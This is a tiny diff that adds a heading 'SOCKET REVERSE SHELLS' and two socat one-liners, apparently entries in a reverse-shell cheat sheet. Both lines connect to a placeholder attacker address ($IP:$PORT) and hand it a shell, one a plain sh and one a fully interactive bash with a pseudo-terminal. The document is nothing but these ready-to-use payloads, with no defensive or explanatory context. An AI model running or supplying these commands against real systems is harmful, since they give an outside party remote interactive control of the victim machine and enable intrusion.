@@ -1,0 +1,3 @@
+SOCKET REVERSE SHELLS
+socat TCP:$IP:$PORT EXEC:sh
+socat TCP:$IP:$PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane 
